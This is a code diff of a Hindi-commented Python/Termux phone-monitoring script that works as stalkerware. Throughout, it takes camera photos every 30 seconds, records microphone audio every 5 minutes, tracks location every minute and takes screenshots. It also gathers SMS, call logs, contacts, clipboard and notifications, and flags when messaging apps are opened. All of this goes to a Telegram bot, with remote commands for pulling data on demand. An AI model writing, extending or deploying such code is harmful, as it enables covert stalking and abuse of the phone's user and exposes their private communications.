@@ -6,28 +6,33 @@ import os
 from datetime import datetime
 
 # =========================================================
-# 🔐 Environment Variables से Token और Chat ID
+# 🔐 Token और Chat ID Environment Variable से पढ़ें
 # =========================================================
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 CHAT_ID = os.getenv('CHAT_ID')
+
 if not BOT_TOKEN or not CHAT_ID:
-    print("❌ ERROR: BOT_TOKEN और CHAT_ID सेट करें!")
+    print("❌ ERROR: BOT_TOKEN और CHAT_ID Environment Variable में सेट करें!")
     exit(1)
 
 # =========================================================
-# ⚙️ कॉन्फ़िगरेशन
+# 📊 कॉन्फ़िगरेशन (इन्हें बदलकर फीचर्स को ऑन/ऑफ करें)
 # =========================================================
-LOCATION_INTERVAL = 300          # 5 मिनट
-SCREENSHOT_INTERVAL = 180        # 3 मिनट
-CAMERA_INTERVAL = 10             # 10 सेकंड (लाइव स्ट्रीम के लिए)
+LOCATION_INTERVAL = 60           # हर 1 मिनट (60 सेकंड) – पहले 5 मिनट था
+SCREENSHOT_INTERVAL = 180        # हर 3 मिनट
 BATTERY_ALERT_LEVELS = [20, 15, 10, 5]
 MONITORED_APPS = ['whatsapp', 'instagram', 'telegram', 'snapchat', 'gmail', 'facebook']
 STORAGE_ALERT_GB = 2
-AUDIO_RECORD_DURATION = 30       # सेकंड
 
+# नए फीचर्स के लिए स्विच (True = चालू, False = बंद)
+LIVE_CAMERA_ENABLED = True       # हर 30 सेकंड में फोटो
+LIVE_AUDIO_ENABLED = True        # हर 5 मिनट में 10 सेकंड ऑडियो
+CAMERA_INTERVAL = 30             # सेकंड (30 सेकंड में एक फोटो)
+AUDIO_INTERVAL = 300             # सेकंड (5 मिनट में एक ऑडियो क्लिप)
+AUDIO_DURATION = 10              # सेकंड (कितनी देर रिकॉर्ड करना है)
 # =========================================================
-# 📨 टेलीग्राम फंक्शंस
-# =========================================================
+
+# ---------- टेलीग्राम फंक्शंस ----------
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -54,15 +59,16 @@ def send_audio_to_telegram(filepath, caption=""):
         with open(filepath, 'rb') as audio:
             files = {'audio': audio}
             data = {'chat_id': CHAT_ID, 'caption': caption}
-            requests.post(url, files=files, data=data, timeout=20)
+            requests.post(url, files=files, data=data, timeout=15)
         return True
     except Exception as e:
         print("❌ Audio Error:", e)
         return False
 
 # =========================================================
-# 🛠 कोर फंक्शंस (बेसिक)
+# 📱 कोर फंक्शन्स (पुराने + नए)
 # =========================================================
+
 def get_current_app():
     try:
         result = subprocess.run(['dumpsys', 'activity', 'activities'], capture_output=True, text=True, timeout=3)
@@ -107,6 +113,30 @@ def take_screenshot():
         subprocess.run(["termux-screencap", "-p", filename], check=True, timeout=10)
         return filename
     except:
+        return None
+
+def take_camera_photo():
+    """📸 Live Camera से फोटो खींचे"""
+    try:
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"/sdcard/dcim/camera_{ts}.jpg"
+        # termux-camera-photo कमांड चलाएँ
+        subprocess.run(["termux-camera-photo", filename], check=True, timeout=5)
+        return filename
+    except Exception as e:
+        print("❌ Camera Error:", e)
+        return None
+
+def record_audio():
+    """🎙️ Live Audio रिकॉर्ड करें (10 सेकंड)"""
+    try:
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"/sdcard/dcim/audio_{ts}.aac"
+        # रिकॉर्डिंग शुरू करें
+        subprocess.run(["termux-microphone-record", "-f", filename, "-l", str(AUDIO_DURATION)], check=True, timeout=AUDIO_DURATION+5)
+        return filename
+    except Exception as e:
+        print("❌ Audio Record Error:", e)
         return None
 
 def get_storage_info():
@@ -176,6 +206,17 @@ def get_app_usage_summary():
     except:
         return "📊 ऐप यूसेज N/A"
 
+def get_communication_summary():
+    try:
+        calls = subprocess.run(['termux-telephony-calllog'], capture_output=True, text=True, timeout=5)
+        sms = subprocess.run(['termux-sms-list'], capture_output=True, text=True, timeout=5)
+        call_data = json.loads(calls.stdout) if calls.stdout else []
+        sms_data = json.loads(sms.stdout) if sms.stdout else []
+        return f"📞 कॉल्स: {len(call_data)} | ✉️ SMS: {len(sms_data)} (पिछले 10)"
+    except:
+        return "📞 कम्युनिकेशन: N/A"
+
+# पुराने फंक्शन्स (calllog, sms, contacts, clipboard, notifications) – ये पहले से हैं
 def get_call_logs():
     try:
         result = subprocess.run(['termux-telephony-calllog'], capture_output=True, text=True, timeout=5)
@@ -234,78 +275,27 @@ def get_notifications():
         data = json.loads(result.stdout)
         if not data: return "🔔 कोई नोटिफिकेशन नहीं"
         lines = []
-        for notif in data[:15]:
-            title = notif.get('title', '')
-            text = notif.get('text', '')
+        for notif in data[:10]:
+            title = notif.get('title', 'No Title')
+            text = notif.get('text', '')[:30]
             pkg = notif.get('package', '').split('.')[-1]
-            if title or text:
-                lines.append(f"📩 {pkg}: {title} - {text[:50]}...")
-        return "🔔 *नोटिफिकेशन (15)*\n" + "\n\n".join(lines) if lines else "🔔 कोई नोटिफिकेशन नहीं"
+            lines.append(f"📩 {pkg}: {title} - {text}...")
+        return "🔔 *नोटिफिकेशन (10)*\n" + "\n\n".join(lines)
     except:
         return "🔔 नोटिफिकेशन नहीं मिला"
 
 # =========================================================
-# 🆕 नए फीचर्स
-# =========================================================
-
-# 📸 कैमरा फोटो (लाइव स्ट्रीम के लिए)
-def take_camera_photo():
-    try:
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"/sdcard/dcim/cam_{ts}.jpg"
-        subprocess.run(["termux-camera-photo", filename], check=True, timeout=5)
-        return filename
-    except:
-        return None
-
-# 🎤 माइक्रोफोन रिकॉर्ड
-def record_audio(duration=30):
-    try:
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"/sdcard/dcim/audio_{ts}.aac"
-        subprocess.run(["termux-microphone-record", "-d", str(duration), filename], check=True, timeout=duration+5)
-        return filename
-    except:
-        return None
-
-# 📍 लोकेशन हिस्ट्री (पिछली 10)
-location_history = []
-def add_location_to_history(loc_str):
-    global location_history
-    location_history.append(loc_str)
-    if len(location_history) > 10:
-        location_history.pop(0)
-
-def get_location_history():
-    if not location_history:
-        return "📍 कोई लोकेशन इतिहास नहीं"
-    msg = "📍 *पिछली 10 लोकेशन*\n"
-    for idx, loc in enumerate(location_history, 1):
-        msg += f"{idx}. {loc}\n"
-    return msg
-
-# 🎥 स्क्रीन रिकॉर्ड (30 सेकंड) - वैकल्पिक
-def record_screen(duration=30):
-    try:
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"/sdcard/dcim/screenrec_{ts}.mp4"
-        subprocess.run(["termux-screen-recorder", "-t", str(duration), filename], check=True, timeout=duration+5)
-        return filename
-    except:
-        return None
-
-# =========================================================
-# 🤖 रिमोट कमांड हैंडलर (नए + पुराने)
+# 🤖 रिमोट कमांड हैंडलर (नए कमांड्स के साथ)
 # =========================================================
 last_update_id = 0
-previous_wifi = ''
+previous_wifi_ssid = 'N/A'
 previous_app = ''
-last_battery = 100
+last_battery_percent = 100
 storage_alert_sent = False
-camera_streaming = False
+counter = 0
 
 def check_telegram_commands():
-    global last_update_id, camera_streaming
+    global last_update_id
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
         params = {'offset': last_update_id + 1, 'timeout': 5}
@@ -320,43 +310,27 @@ def check_telegram_commands():
                 text = msg.get('text', '').strip().lower()
                 if not text.startswith('/'):
                     continue
-
+                
                 # --- नए कमांड्स ---
                 if text == '/camera':
-                    if not camera_streaming:
-                        camera_streaming = True
-                        send_telegram("📸 *कैमरा स्ट्रीम शुरू* (हर 10 सेकंड में फोटो)\n/streamoff से बंद करें")
+                    fname = take_camera_photo()
+                    if fname and os.path.exists(fname):
+                        send_photo_to_telegram(fname, "📸 Live Camera")
+                        os.remove(fname)
                     else:
-                        send_telegram("📸 कैमरा पहले से चालू है")
-                elif text == '/streamoff':
-                    camera_streaming = False
-                    send_telegram("📸 कैमरा स्ट्रीम बंद")
-                elif text == '/record':
-                    send_telegram("🎤 30 सेकंड ऑडियो रिकॉर्ड कर रहा हूँ...")
-                    audio_file = record_audio(AUDIO_RECORD_DURATION)
-                    if audio_file and os.path.exists(audio_file):
-                        send_audio_to_telegram(audio_file, "🎤 ऑडियो रिकॉर्डिंग")
-                        os.remove(audio_file)
+                        send_telegram("❌ कैमरा नहीं खुल सका (Permission?)")
+                elif text == '/audio':
+                    fname = record_audio()
+                    if fname and os.path.exists(fname):
+                        send_audio_to_telegram(fname, "🎙️ Live Audio")
+                        os.remove(fname)
                     else:
-                        send_telegram("❌ ऑडियो रिकॉर्ड फेल")
-                elif text == '/locationhistory':
-                    send_telegram(get_location_history())
-                elif text == '/screenrec':
-                    send_telegram("🎥 30 सेकंड स्क्रीन रिकॉर्ड कर रहा हूँ...")
-                    video_file = record_screen(30)
-                    if video_file and os.path.exists(video_file):
-                        # टेलीग्राम 50MB limit, small video
-                        send_telegram("🎥 स्क्रीन रिकॉर्डिंग तैयार है, लेकिन बड़ी फ़ाइल के कारण सीधे भेजना संभव नहीं, इसे मैन्युअली चेक करें")
-                        # वैकल्पिक: डाउनलोड लिंक भेजें (यहाँ हम इसे छोड़ रहे हैं)
-                        os.remove(video_file)
-                    else:
-                        send_telegram("❌ स्क्रीन रिकॉर्ड फेल")
-                elif text == '/notify':
-                    # नोटिफिकेशन कैप्चर (पुराना /notif ही है, पर हम इसे डुप्लिकेट कर सकते हैं)
-                    send_telegram(get_notifications())
+                        send_telegram("❌ ऑडियो रिकॉर्ड नहीं हुआ (Permission?)")
                 elif text == '/storage':
                     avail, info = get_storage_info()
                     send_telegram(info)
+                elif text == '/summary':
+                    send_telegram(get_app_usage_summary())
                 elif text == '/battery':
                     level, status = get_battery()
                     send_telegram(f"🔋 *बैटरी*\n%: {level}\nस्टेटस: {get_charging_status(status)}")
@@ -366,9 +340,7 @@ def check_telegram_commands():
                 elif text == '/screen':
                     send_telegram(f"🖥️ *स्क्रीन*\n{get_screen_on_time()}")
                 elif text == '/comms':
-                    send_telegram(get_call_logs() + "\n\n" + get_sms_list())
-                elif text == '/summary':
-                    send_telegram(get_app_usage_summary())
+                    send_telegram(get_communication_summary())
                 elif text == '/report':
                     level, status = get_battery()
                     avail, storage_info = get_storage_info()
@@ -379,10 +351,9 @@ def check_telegram_commands():
                            f"📶 Wi-Fi: {ssid}\n"
                            f"💾 स्टोरेज: {avail:.1f}GB बचा\n"
                            f"{get_app_usage_summary()}\n"
-                           f"{get_call_logs()}\n"
-                           f"{get_sms_list()}")
+                           f"{get_communication_summary()}")
                     send_telegram(msg)
-                # --- पुराने कमांड्स (बाकी) ---
+                # --- पुराने कमांड्स (सभी) ---
                 elif text == '/status':
                     level, status = get_battery()
                     send_telegram(f"📱 *{get_current_app()}*\n🔋 {level}% ({get_charging_status(status)})")
@@ -394,9 +365,7 @@ def check_telegram_commands():
                     else:
                         send_telegram("❌ स्क्रीनशॉट नहीं लिया")
                 elif text == '/location':
-                    loc = get_location()
-                    send_telegram(loc)
-                    add_location_to_history(loc)  # हिस्ट्री में सेव
+                    send_telegram(get_location())
                 elif text == '/calllog':
                     send_telegram(get_call_logs())
                 elif text == '/sms':
@@ -407,113 +376,124 @@ def check_telegram_commands():
                     send_telegram(get_clipboard())
                 elif text == '/notif':
                     send_telegram(get_notifications())
+                elif text == '/help':
+                    help_text = (
+                        "🤖 *सभी कमांड्स*\n\n"
+                        "📸 /camera – Live Camera फोटो\n"
+                        "🎙️ /audio – Live Audio रिकॉर्डिंग\n"
+                        "📊 /status, /battery, /storage, /screen\n"
+                        "📍 /location\n"
+                        "📶 /wifistatus\n"
+                        "📞 /calllog, /sms, /contacts, /comms\n"
+                        "📋 /clipboard, /notif, /summary, /report\n"
+                        "/all – सब एक साथ"
+                    )
+                    send_telegram(help_text)
                 elif text == '/all':
                     level, status = get_battery()
                     avail, storage_info = get_storage_info()
                     ssid, bssid = get_wifi_info()
-                    loc = get_location()
-                    add_location_to_history(loc)
-                    msg = (f"📊 *सब कुछ*\n"
+                    msg = (f"📊 *ऑल इन वन*\n"
                            f"📱 ऐप: {get_current_app()}\n"
                            f"🔋 {level}% ({get_charging_status(status)})\n"
                            f"📶 {ssid}\n"
                            f"💾 {avail:.1f}GB बचा\n"
-                           f"{loc}\n"
-                           f"{get_app_usage_summary()}\n"
-                           f"{get_call_logs()}\n"
-                           f"{get_sms_list()}")
+                           f"{get_location()}\n"
+                           f"{get_app_usage_summary()}")
                     send_telegram(msg)
-                elif text == '/help':
-                    help_text = (
-                        "🤖 *सभी कमांड्स*\n\n"
-                        "📸 /camera - कैमरा स्ट्रीम शुरू (हर 10 सेकंड)\n"
-                        "🛑 /streamoff - कैमरा बंद\n"
-                        "🎤 /record - 30 सेकंड ऑडियो रिकॉर्ड\n"
-                        "🎥 /screenrec - 30 सेकंड स्क्रीन रिकॉर्ड\n"
-                        "📍 /locationhistory - पिछली 10 लोकेशन\n"
-                        "📊 /status, /battery, /storage, /wifi, /screen\n"
-                        "📋 /screenshot, /clipboard, /notif, /notify\n"
-                        "📞 /calllog, /sms, /contacts, /comms\n"
-                        "📈 /summary, /report, /all, /location"
-                    )
-                    send_telegram(help_text)
                 else:
                     send_telegram("❓ /help देखें")
     except Exception as e:
         print("⚠️ कमांड एरर:", e)
 
 # =========================================================
-# 🔄 मुख्य लूप
+# 🔄 मुख्य लूप (सभी फीचर्स एक्टिव)
 # =========================================================
-print("🚀 मेगा मॉनिटर शुरू (कैमरा + माइक + लोकेशन हिस्ट्री)")
+print("🚀 सुपर मॉनिटर – नए फीचर्स (Live Camera, Live Audio, 1-Min Location)")
 time.sleep(2)
 
+# स्टेटस वेरिएबल्स
+previous_app = ''
+previous_wifi = ''
+last_battery = 100
+storage_alert_sent = False
 counter = 0
+camera_counter = 0
+audio_counter = 0
+
 while True:
     try:
+        # 1. Telegram कमांड चेक करें
         check_telegram_commands()
         
+        # 2. बेसिक डेटा लें
         current_app = get_current_app()
         battery_level, battery_status = get_battery()
         battery_level = int(battery_level) if battery_level != 'N/A' else 0
         current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
         
-        # बैटरी अलर्ट
+        # 3. बैटरी अलर्ट
         for alert_level in BATTERY_ALERT_LEVELS:
             if battery_level <= alert_level and last_battery > alert_level:
                 send_telegram(f"⚠️ *बैटरी अलर्ट!*\n🔋 {battery_level}% बचा है!\n⏰ {current_time}")
                 break
         last_battery = battery_level
         
-        # स्टोरेज अलर्ट
+        # 4. स्टोरेज अलर्ट
         avail, storage_info = get_storage_info()
         if avail < STORAGE_ALERT_GB and not storage_alert_sent:
-            send_telegram(f"⚠️ *स्टोरेज कम!*\n💾 {avail:.1f}GB बचा")
+            send_telegram(f"⚠️ *स्टोरेज कम है!*\n💾 सिर्फ {avail:.1f}GB बचा है!\n{storage_info}")
             storage_alert_sent = True
         elif avail > STORAGE_ALERT_GB:
             storage_alert_sent = False
         
-        # Wi-Fi बदलाव
+        # 5. Wi-Fi बदलने पर अलर्ट
         wifi_ssid, wifi_bssid = get_wifi_info()
         if wifi_ssid != 'N/A' and wifi_ssid != previous_wifi and previous_wifi != '':
-            send_telegram(f"📶 *Wi-Fi बदला:* {wifi_ssid}")
+            send_telegram(f"📶 *Wi-Fi बदला!*\nनया: {wifi_ssid}\n⏰ {current_time}")
         previous_wifi = wifi_ssid
         
-        # मॉनिटर किए गए ऐप्स
+        # 6. खास ऐप्स खुलने पर अलर्ट
         for monitored in MONITORED_APPS:
             if monitored in current_app.lower() and monitored not in previous_app.lower():
-                send_telegram(f"👀 *{monitored.capitalize()} खुला!*")
+                send_telegram(f"👀 *{monitored.capitalize()} खुला!*\n⏰ {current_time}")
                 break
         
-        # ऑटो स्क्रीनशॉट
+        # 7. ऑटो स्क्रीनशॉट (हर 3 मिनट)
         if counter % (SCREENSHOT_INTERVAL // 10) == 0:
             fname = take_screenshot()
             if fname and os.path.exists(fname):
                 send_photo_to_telegram(fname, f"📸 ऑटो ({current_time})")
                 os.remove(fname)
         
-        # ऑटो लोकेशन
+        # 8. ऑटो लोकेशन (हर 1 मिनट – नया)
         if counter % (LOCATION_INTERVAL // 10) == 0:
-            loc = get_location()
-            send_telegram(f"{loc}\n⏰ {current_time}")
-            add_location_to_history(loc)
+            send_telegram(f"{get_location()}\n⏰ {current_time}")
         
-        # कैमरा स्ट्रीम (अगर चालू है)
-        if camera_streaming:
-            cam_file = take_camera_photo()
-            if cam_file and os.path.exists(cam_file):
-                send_photo_to_telegram(cam_file, f"📸 लाइव ({current_time})")
-                os.remove(cam_file)
+        # 9. Live Camera (हर 30 सेकंड – नया)
+        if LIVE_CAMERA_ENABLED and counter % (CAMERA_INTERVAL // 10) == 0:
+            fname = take_camera_photo()
+            if fname and os.path.exists(fname):
+                send_photo_to_telegram(fname, f"📸 Live Camera ({current_time})")
+                os.remove(fname)
         
-        # ऐप बदलने पर स्टेटस
+        # 10. Live Audio (हर 5 मिनट – नया)
+        if LIVE_AUDIO_ENABLED and counter % (AUDIO_INTERVAL // 10) == 0:
+            fname = record_audio()
+            if fname and os.path.exists(fname):
+                send_audio_to_telegram(fname, f"🎙️ Live Audio ({current_time})")
+                os.remove(fname)
+        
+        # 11. ऐप बदलने पर अपडेट
         if current_app != previous_app:
             send_telegram(f"📱 *{current_app}*\n🔋 {battery_level}%\n⏰ {current_time}")
             previous_app = current_app
         
-        # घंटे की रिपोर्ट
-        if counter % 360 == 0:
-            send_telegram(f"📊 *घंटे की रिपोर्ट*\n{get_app_usage_summary()}\n{get_call_logs()}\n{get_sms_list()}")
+        # 12. हर घंटे रिपोर्ट
+        if counter % 360 == 0:  # 360 * 10 सेकंड = 1 घंटा
+            send_telegram(f"📊 *घंटे की रिपोर्ट*\n{get_app_usage_summary()}\n{get_communication_summary()}")
         
+        # काउंटर बढ़ाएँ
         counter += 1
         time.sleep(10)
         
